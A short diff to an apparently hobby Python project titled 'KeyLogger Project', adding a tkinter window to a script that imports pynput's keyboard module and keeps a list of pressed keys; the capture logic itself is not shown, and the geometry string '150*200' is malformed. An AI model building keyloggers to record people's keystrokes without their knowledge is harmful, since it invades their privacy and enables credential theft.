@@ -1,5 +1,12 @@
+import tkinter as tk
+from tkinter import *
 from pynput import keyboard
 import json
+
+root = tk.Tk()
+root.geometry("150*200")
+root.title("KeyLogger Project")
+
 
 key_list = []
 x = False #Value to determine if held
